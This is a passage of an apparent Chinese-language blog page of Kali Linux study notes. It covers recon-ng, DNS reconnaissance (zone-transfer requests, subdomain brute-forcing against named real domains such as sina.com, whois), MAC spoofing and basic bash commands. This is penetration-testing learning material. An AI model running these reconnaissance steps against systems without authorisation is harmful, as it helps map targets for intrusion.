<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;10&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/10/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%89)%EF%BC%9AMaltego/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%89)%EF%BC%9AMaltego/" itemprop="url">Kali Linux笔记(十三)：Maltego</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
                2019-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  10 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-MELTAGO"><a href="#1-MELTAGO" class="headerlink" title="1. MELTAGO"></a>1. MELTAGO</h4><ul>
<li>申请账号</li>
<li>登陆使用</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%8C)%EF%BC%9ARECON-NG/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%8C)%EF%BC%9ARECON-NG/" itemprop="url">Kali Linux笔记(十二)：RECON-NG</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
                2019-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  835 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-RECON-NG（▲2019-11-30需自行安装moudles）"><a href="#1-RECON-NG（▲2019-11-30需自行安装moudles）" class="headerlink" title="1. RECON-NG（▲2019.11.30需自行安装moudles）"></a>1. RECON-NG（▲2019.11.30需自行安装moudles）</h4><ul>
<li><p>全特性的web侦擦框架（综合工具，模块去完成）</p>
</li>
<li><p>基于Python开发</p>
</li>
<li><p>Web信息搜索框架（通过google搜索引擎）</p>
</li>
<li><p>命令格式与msf一致（需熟练使用）</p>
</li>
<li><p>基于python开发</p>
</li>
<li><p>使用方法：</p>
<ul>
<li>模块（不同模块调用不同的搜索引擎，调用API接口）</li>
<li>数据库</li>
<li>报告</li>
</ul>
</li>
<li><p>全局选项</p>
<ul>
<li>recon-ng （进入default模块）</li>
<li>back（退回上一个模块）、exit（退出recon-ng）</li>
<li>add（向数据库插入表）、del   ▲2019.11.30 集成于keys</li>
<li>keys（framework API keys，搜索引擎的API）</li>
<li>load（自己编写的模块可以load进来） ▲2019.11.30 集成于modules</li>
<li>pdb（python的debug模式进行调试）</li>
<li>query（查询数据库，跟上标准SQL语言） ▲2019.11.30 集成于db</li>
<li>record（在recon-ng下的命令进行记录，-r参数进行调用） ▲2019.11.30 修改为script</li>
<li>reload（修改模块后可以reload） ▲2019.11.30 集成于modules</li>
<li>resourece（在框架下可以用-r调用recond文件）▲2019.11.30删除此模块</li>
<li>search（seach相关的模块有哪些） ▲2019.11.30 集成于marketplace</li>
<li>set（设置选项） ▲2019.11.30 集成于options</li>
<li>shell（在框架下执行shell 命令）</li>
<li>show（显示当前框架的各种信息）</li>
<li>snapshots（快照）</li>
<li>spool（资源池划分，也可以导出）</li>
<li>unset（清楚设置） ▲2019.11.30 集成于options</li>
<li>use（使用各种模块） ▲2019.11.30 删除此模块</li>
<li>workspaces（管理工作区）</li>
</ul>
</li>
<li><p>recon-ng -h</p>
<ul>
<li>-h（help选项）</li>
<li>-v（version版本）</li>
<li>-w（load/create a workspace）</li>
<li>-r filename（workspace，创建一个工作区）</li>
<li>–no-check（disable version check）</li>
<li>–no-analytics（disable analytics reporting，不检查报告模块）</li>
</ul>
</li>
<li><p>recon-ng -w（创建工作区） sina</p>
</li>
<li><p>workspaces list（查看工作区）</p>
</li>
<li><p>keys list（支持网站api）</p>
</li>
<li><p>keys add API类型 具体API</p>
</li>
<li><p>marketplace search google</p>
</li>
<li><p>shell ls</p>
</li>
<li><p>show options（当前可以option选项）</p>
</li>
<li><p>options set PROXY 127.0.0.1 8087（设置代理）</p>
</li>
<li><p>options set USER-AGETN “某一浏览器的字段”</p>
</li>
<li><p>unset USER-AGENT（清空设置）</p>
</li>
<li><p>snapshots take（作一次snapshots快照）</p>
</li>
<li><p>snapshots load（使用以前的快照）</p>
</li>
</ul>
<blockquote>
<pre><code>recon-ng两下Tab键可以看到所有的命令
全局模式下的options：DEBUG、NAMESERVER、PROXY、THREADS、TIMEOUT、USER-AGENT、VERBOSE
DEBUG--python的debug调试
NAMESERVER--域名解析服务器
PROXY--代理 ▲2019.11.30代理暂无法使用
THREADS--线程，搜索引擎有保护机制
TIMEOUT--超时
USER-AGENT--需要进行伪装，user-agent字段</code></pre></blockquote>
<ul>
<li><p>use 模块（harketarget模块可用）</p>
<ul>
<li>DNS查询</li>
</ul>
<ol>
<li>Google</li>
<li>Baidu</li>
<li>Bing</li>
<li>Yahoo</li>
<li>Brute force</li>
</ol>
</li>
</ul>
<blockquote>
<p>   Google模式 ▲2019.11.30模块暂不可用</p>
<ol>
<li>marketplace search google</li>
<li>modules load recon/domains-hosts/google_site_web（也可以使用api）</li>
<li>show options</li>
<li>show info</li>
<li>options set SOURCE 域名</li>
<li>run</li>
<li>show hosts/query select * from hosts</li>
</ol>
</blockquote>
<blockquote>
<p>   bing模式 ▲2019.11.30模块暂不可用</p>
<ol>
<li>marketplace search bing</li>
<li>modules load recon/domains-hosts/bing_site_web</li>
<li>show options</li>
<li>options set SOURCE 域名</li>
<li>run</li>
<li>query select * from hosts where host like ‘%www%’（复杂sql查询）</li>
</ol>
</blockquote>
<blockquote>
<p>   brute模式（不解析IP地址）</p>
<ol>
<li>marketplace search brute</li>
<li>modules load recon/domains-hosts/brute_hosts</li>
<li>show options</li>
<li>options set SOURCE/WORDLIST  </li>
<li>run</li>
</ol>
</blockquote>
<ul>
<li>use 模块（harketarget模块可用）<ul>
<li>解析IP地址（查询数据库，存在负载均衡）</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>marketplace search resolve</li>
<li>modules load recon/hosts-hosts/resolve</li>
<li>show options</li>
<li>show info</li>
<li>options set SOURCE query select host from hosts where host like ‘%sina.com.cn%’</li>
<li>show hosts</li>
<li>options set SOURCE query select host from hosts</li>
<li>show hosts</li>
</ol>
</blockquote>
<ul>
<li>use 模块（harketarget模块可用）<ul>
<li>联系人</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>marketplace search contact</li>
</ol>
</blockquote>
<ul>
<li>use 模块（harketarget模块可用）<ul>
<li>报告</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>marketplace search report</li>
<li>modules load reporting/html</li>
<li>show options</li>
<li>options set CREATOR 创建者</li>
<li>options set CUSTOMER 客户</li>
<li>options set FILENAME 路径</li>
<li>options set SANITIZE TRUE（是否对私密消息进行mask）</li>
</ol>
</blockquote>
<ul>
<li>use 模块（harketarget模块可用）<ul>
<li>API</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81)%EF%BC%9ADNS%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81)%EF%BC%9ADNS%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url">Kali Linux笔记(十)：DNS信息收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
                2019-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  889 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-信息收集-DNS"><a href="#1-信息收集-DNS" class="headerlink" title="1. 信息收集-DNS"></a>1. 信息收集-DNS</h4><ul>
<li>域名解析成IP地址<ul>
<li>域名（qq.com）与FQDN（完全限定域名<a href="http://www.qq.com）的区别" target="_blank" rel="noopener">www.qq.com）的区别</a></li>
<li>域名记录：A（IPV4主机记录）、C name（别名记录）、NS（域名服务器地址对域解析）、MX（邮件服务器地址对域解析）、ptr（通过IP地址反向解析域名）、text（spf反向垃圾邮件域名）、SOA（启始授权）、AAAA（IPV6地址）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>DNS客户端 → 本地DNS服务器 → 根域服务器 → com服务器 → example.com服务器
1.递归查询（一轮一轮递归） 2.迭代查询（从顶至下）
缓存DNS服务器本身并不包含DNS记录（常用于本地DNS服务器）
spf 反向垃圾域名服务，判断邮件的域名是否伪造</code></pre></blockquote>
<h4 id="2-DNS信息收集-NSLOOKUP"><a href="#2-DNS信息收集-NSLOOKUP" class="headerlink" title="2. DNS信息收集-NSLOOKUP"></a>2. DNS信息收集-NSLOOKUP</h4><ul>
<li><strong><code>🔺命令：nslookup 域名</code></strong></li>
<li><strong><code>🔺命令：nslookup set type=mx（查询类型） 域名</code></strong> （数值越小，优先级越高）</li>
<li><strong><code>🔺命令：nslookup set type=ns 域名</code></strong></li>
<li><strong><code>🔺命令：nslookup set type=ptr ip地址</code></strong> ▲2019.11.27反向域名解析大概率查不到</li>
<li><strong><code>🔺命令：nslookup server 202.106.0.20（其他ISP域名服务器的ip地址）</code></strong></li>
</ul>
<blockquote>
<pre><code>网络为智能DNS，选取最近的DNS服务器，不同地址的DNS服务器是不一样的，边缘网络</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：nslookup set type=any（任何域名）域名</code></strong></li>
</ul>
<h4 id="3-DNS信息收集-DIG"><a href="#3-DNS信息收集-DIG" class="headerlink" title="3. DNS信息收集-DIG"></a>3. DNS信息收集-DIG</h4><ul>
<li><strong><code>🔺命令：dig 8.8.8.8 域名 mx</code></strong></li>
<li><strong><code>🔺命令：dig 域名 any</code></strong></li>
<li>带参数：<strong><code>🔺命令：dig +noall +answer 域名 any | awk &#39;{print $5}&#39;</code></strong>▲2019.11.27难以查到</li>
<li>反向查询：<strong><code>🔺命令：dig -x ip地址（PTR）</code></strong></li>
<li>bind版本信息：<strong><code>🔺命令：dig +noall +answer txt chaos（class类） VERSION BIND 域名</code></strong> ▲2019.11.27难以查到</li>
<li>DNS追踪：<strong><code>🔺命令：dig +trace 域名</code></strong>（迭代查询）、<strong><code>🔺命令：dig 域名（递归查询）</code></strong></li>
</ul>
<blockquote>
<pre><code>指定域名服务器查询域名
1.nslooup www.sina.com -type=a 8.8.8.8
2.dig www.sina.com any @8.8.8.8
trace追踪域名
本机（随机挑选root的IP地址） → root（随机挑选com的IP地址） → com（随机挑选sina.com的IP地址） → sina.com（随机挑选IP地址） → www.sina.com（挑选A记录）
▲抓包分析递归查询和迭代查询的区别
▲域名解析服务器跟域名后缀可以不同（top. → d.zdnscloud.com.）</code></pre></blockquote>
<h4 id="4-DNS区域传输（DNS的同步机制）"><a href="#4-DNS区域传输（DNS的同步机制）" class="headerlink" title="4. DNS区域传输（DNS的同步机制）"></a>4. DNS区域传输（DNS的同步机制）</h4><ul>
<li><strong><code>🔺命令：dig ns1.example.com example.com axfr（差异化传输方法Request for full zone transfer）</code></strong></li>
<li><strong><code>🔺命令：host -T（用TCP传输方式） -l（axfr） sina.com ns3.sina.com</code></strong></li>
</ul>
<blockquote>
<pre><code>TCP用于DNS之间的域名传输
UDP用于DNS之间的查询</code></pre></blockquote>
<h4 id="5-DNS字典爆破"><a href="#5-DNS字典爆破" class="headerlink" title="5. DNS字典爆破"></a>5. DNS字典爆破</h4><ul>
<li><strong><code>🔺命令：fierce -dnsserver（指定DNS服务器） 8.8.8.8 -dns（要查询的域） sina.com.cn -wordlist（字典，明确字典路径） a.txt</code></strong></li>
<li><strong><code>🔺命令：dnsdict6 -d（显示IPV6）4（显示IPV4） -t（并发线程数） 16 -x（不同级别） sina.com  （-D 自己指定字典，-U 最大的字典）</code></strong></li>
<li><strong><code>🔺命令：dnsenum -f（字典，明确字典路径） dnsbig.txt -dnsserver 8.8.8.8 sina.com -o（导出成一个文件） sina.xml</code></strong></li>
<li><strong><code>🔺命令：dnsmap sina.com -w（字典，明确字典路径） dns.txt</code></strong></li>
<li><strong><code>🔺命令：dnsrecon -d（指定域名服务器） sina.com --lifetime（超时时间）10 -t（查询强度） brt（暴力爆破） -D（字典，明确字典路径） dnsbig.txt</code></strong></li>
<li><strong><code>🔺命令：dnsrecon -t std（标准爆破） -d sina.com -D（字典，明确字典路径） dnsbig.txt</code></strong></li>
</ul>
<blockquote>
<pre><code>查看程序相关文件
dpkg -L fierce
find / -name dnsenum</code></pre></blockquote>
<h4 id="6-DNS注册信息"><a href="#6-DNS注册信息" class="headerlink" title="6. DNS注册信息"></a>6. DNS注册信息</h4><ul>
<li><strong><code>🔺命令：whois 域名</code></strong></li>
<li><strong><code>🔺命令：whois IP地址</code></strong></li>
<li><strong><code>🔺命令：whois -h whois.apnic.net IP地址</code></strong></li>
</ul>
<blockquote>
<pre><code>网页查询
AFRINIC  http://www.afrinic.net
APNIC    http://www.apnic.net
ARIN     http://whois.arin.net
IANA     http://www.iana.com 
ICANN    http://www.icann.org
LACNIC   http://www.lacnic.net
NRO      http://www.nro.net
RIPE     http://www.ripe.net
InterNic http://www.internic.net</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89)%EF%BC%9A%E7%8E%AF%E5%A2%83%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89)%EF%BC%9A%E7%8E%AF%E5%A2%83%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" itemprop="url">Kali Linux笔记(三)：环境、环境配置</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
                2019-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  3.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  13 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-熟悉环境"><a href="#1-熟悉环境" class="headerlink" title="1. 熟悉环境"></a>1. 熟悉环境</h4><ul>
<li>登陆密码</li>
<li>Top10安全工具<ul>
<li>aircrack-ng（wifi无线渗透）</li>
<li>hydra，john（密码破解）</li>
<li>burpsuit（web渗透）</li>
<li>maltego（信息收集）</li>
<li>metasploit framework（渗透测试框架，跟kail同个水平）</li>
<li>nmap（网络发现层的扫描器）</li>
<li>owasp-zap（web渗透测试工具）</li>
<li>sqlmap（sql注入工具，python语言开发）</li>
<li>wireshark（抓包分析工具）</li>
</ul>
</li>
<li>字体调整<ul>
<li><strong><code>🔺命令：gnome-tweak-tool</code></strong></li>
</ul>
</li>
<li>监视网络流量<ul>
<li><strong><code>🔺命令：apt-get install netspeed</code></strong>（2.0版本得上官网下载）</li>
</ul>
</li>
</ul>
<blockquote>
<p>新的安装方式：<a href="https://blog.csdn.net/coding_or_dead/article/details/53523596" target="_blank" rel="noopener">https://blog.csdn.net/coding_or_dead/article/details/53523596</a></p>
</blockquote>
<blockquote>
<p>扩展在software中，可以看到Extension setting</p>
</blockquote>
<ul>
<li>监视网络流量<ul>
<li>按住alt，右键添加网络流量监视（显示字节形式）</li>
</ul>
</li>
<li>强行终止程序<ul>
<li>按住alt，右键添加强制退出</li>
</ul>
</li>
<li>文件目录</li>
</ul>
<blockquote>
<p>/medir /mnt 都可以挂载目录，个人使用习惯</p>
</blockquote>
<ul>
<li>共享文件</li>
</ul>
<h4 id="2-熟悉BASH命令"><a href="#2-熟悉BASH命令" class="headerlink" title="2. 熟悉BASH命令"></a>2. 熟悉BASH命令</h4><blockquote>
<pre><code>终端界面为一个Shell,用户与系统交互的一个通道
A shell、B shell（kali默认）、D shell</code></pre></blockquote>
<ul>
<li>ls(查看文件)<ul>
<li>ls -l 查看常规格式显示文件信息 </li>
<li>ls /dev -l 目录第一个参数基本涵盖</li>
<li>ls -a 显示所有文件信息（显示隐藏文件）</li>
<li>ls -lh 以容易阅读的方式显示文件大小</li>
<li>ls -lh –sort=size 以大小进行排序</li>
<li>ls -lh –sort=time 以时间进行排序</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>第一个参数属性：
c--表示一个字符型设备
d--表示一个目录
l--表示一个链接，类似于window里面的快捷方式
b--表示一个块设备，block，硬盘分区sda</code></pre></blockquote>
<ul>
<li>cd（进入某个目录）<ul>
<li>cd . 当前目录</li>
<li>cd .. 当前目录的上一级目录</li>
</ul>
</li>
<li>pwd（查看当前工作目录）</li>
<li>cat（查看日志文件内容）<ul>
<li>cat /var/log/message（系统改变的信息）</li>
</ul>
</li>
<li>more(查看系统变化信息，下一屏幕通过Enter，q退出，同cat)</li>
<li>less(查看文件，跟more命令基本一样，同cat)</li>
<li>tail(默认显示最下面10行的内容，同cat)<ul>
<li>tail -20（查看最下面二十行）</li>
</ul>
</li>
<li>watch -n 指定进程 tail -行数 文件（watch和tail的联合）</li>
<li>cp（对文件进行复制）<ul>
<li>cp 文件名1 文件名2</li>
<li>cp -r 目录1 目录2</li>
</ul>
</li>
<li>rm（删除文件）<ul>
<li>rm 文件名</li>
<li>rm -r 目录名</li>
</ul>
</li>
<li>top(监视linux系统性能参数，每隔几秒钟进行更新，q退出)<ul>
<li>kill 进行PID（在top界面）</li>
</ul>
</li>
<li>ps（查看进程信息）<ul>
<li>ps -ef（查看进程详细信息，PPID父进程）</li>
<li>ps aux（同-ef显示项目相同，显示列信息稍微不同）</li>
</ul>
</li>
<li>grep（筛选输出内容）<ul>
<li>grep 所查内容 路径（例如：grep ssh /etc/passwd）</li>
</ul>
</li>
<li>ifconfig（查看当前网络配置信息）<ul>
<li>ifconfig 网卡 down（关闭网卡，macchanger -m 新MAC地址 网卡）</li>
</ul>
</li>
<li>netstat（查看网络连接信息）<ul>
<li>netstat -pantu（查看计算机与服务器产生的TCP、UDP连接）</li>
<li>netstat -pantu | egrep -v ‘0.0.0.0’| awk ‘{print $5}’</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>netstat -pantu | egrep -v &apos;0.0.0.0&apos;| awk &apos;{print $5}&apos; | cut -d &apos;:&apos; -f 1| egrep -v &apos;And&apos;| egrep -v &apos;Address&apos; | sort | uniq &gt; ip(文件)
awk--只显示（$列数）的数据，以空格作为间隔
sort--排序
cut--同egrep，分隔
uniq--把重复的内容只显示一次</code></pre></blockquote>
<ul>
<li>route(路由，网络信息)</li>
<li>mount（挂载文件夹，可本地可远程）<ul>
<li>mount -o loop iso文件 路径</li>
</ul>
</li>
<li>dmesg(查看messages文件内容，同tail，但不需要路径)</li>
<li>find（查找文件，目录）<ul>
<li>find 查找开始位置 -name “文件名称”（区分大小写）</li>
<li>find 查找开始位置 -iname “文件名称”（不区分大小写） </li>
<li>find .（当前目录） -name “文件名+通配符”</li>
<li>find .（当前目录） -name “文件名+通配符” -exec cp () /路径/{}.bak ;（隐藏目录不操作）</li>
</ul>
</li>
<li>whereis（系统数据库搜索路径，需要通过本地包安装，不可源码安装） <ul>
<li>whereis -b 文件名（查看二进制文件）</li>
